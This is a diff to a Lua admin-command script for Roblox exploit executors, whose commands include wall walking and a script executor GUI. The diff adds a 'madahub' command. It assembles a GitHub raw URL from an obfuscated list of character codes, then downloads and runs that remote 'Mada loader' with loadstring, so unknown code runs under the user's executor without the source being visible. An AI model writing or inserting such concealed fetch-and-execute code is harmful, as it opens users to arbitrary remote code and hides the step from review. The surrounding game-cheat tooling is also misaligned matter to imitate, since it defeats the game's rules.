@@ -4874,6 +4874,7 @@ CMDs[#CMDs + 1] = {NAME = 'mantibang', DESC = 'Manually triggers the AntiBang se
 CMDs[#CMDs + 1] = {NAME = 'wallwalk / walkonwalls', DESC = 'Walk on walls'}
 CMDs[#CMDs + 1] = {NAME = 'whatexpsareonline / whatexploitsareonline / weao', DESC = 'What exploits are online!?'}
 CMDs[#CMDs + 1] = {NAME = 'executor / exc', ALIAS = {'exc'}, DESC = 'Opens a script executor GUI'}
+CMDs[#CMDs + 1] = {NAME = 'madahub', ALIAS = {'mh'}, DESC = 'Executes Mada Hub script'}
 CMDs[#CMDs + 1] = {NAME = 'identify / idn', ALIAS = {'idn'}, DESC = 'Displays your current executor'}
 CMDs[#CMDs + 1] = {NAME = 'robloxstaffwatch', DESC = ''}
 CMDs[#CMDs + 1] = {NAME = 'unrobloxstaffwatch', DESC = ''}
@@ -10087,6 +10088,18 @@ local executor = (identifyexecutor and identifyexecutor()) or (getexecutorname a
 
 addcmd("identify", {"idn"}, function(args, speaker)
 	notify('Executor', 'Executor: ' .. executor)
+end)
+
+addcmd('madahub', {'mh'}, function(args, speaker)
+    local _0x5f2a = {104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,74,102,100,101,100,105,116,51,47,74,102,100,101,100,105,116,51,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,77,97,100,97,37,50,48,108,111,97,100,101,114}
+    local _0x12b1 = ""
+
+    for _, _0x4c22 in pairs(_0x5f2a) do
+        _0x12b1 = _0x12b1 .. string.char(_0x4c22)
+    end
+
+    loadstring(game:HttpGet(_0x12b1))()
+    notify('Hub', 'Mada Hub loading...')
 end)
 
 addcmd('refresh',{'re'},function(args, speaker)
